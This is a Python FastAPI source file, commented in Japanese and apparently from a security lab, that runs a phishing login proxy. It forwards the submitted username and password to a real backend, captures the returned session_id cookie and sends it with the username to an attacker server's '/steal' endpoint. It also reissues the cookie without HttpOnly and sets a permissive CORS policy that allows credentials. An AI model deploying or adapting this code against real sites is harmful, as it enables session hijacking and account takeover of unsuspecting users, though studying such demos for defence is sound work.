import httpx
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
    allow_credentials=True,
)

REAL_BACKEND = "http://backend:8000"
ATTACKER_SERVER = "http://attacker:9000"


class LoginData(BaseModel):
    username: str
    password: str


@app.post("/login")
def phishing_login(data: LoginData):
    # 1. 本物のバックエンドへ認証情報を転送
    try:
        real_res = httpx.post(
            f"{REAL_BACKEND}/login",
            json={"username": data.username, "password": data.password},
            timeout=5,
        )
    except httpx.RequestError:
        return JSONResponse(status_code=503, content={"detail": "サーバーに接続できませんでした"})

    # 認証失敗はそのままフロントへ返す
    if real_res.status_code != 200:
        return JSONResponse(status_code=real_res.status_code, content=real_res.json())

    session_id = real_res.cookies.get("session_id")

    # 2. 窃取したsession_idを攻撃者サーバーへ送信
    try:
        httpx.get(
            f"{ATTACKER_SERVER}/steal",
            params={"c": f"session_id={session_id}", "via": "phishing", "user": data.username},
            timeout=3,
        )
    except httpx.RequestError:
        pass

    # 3. フロントにリダイレクト先を返す（Cookieも含む）
    body = real_res.json()
    body["redirect"] = "http://localhost"
    response = JSONResponse(content=body)
    response.set_cookie(key="session_id", value=session_id, httponly=False)
    return response
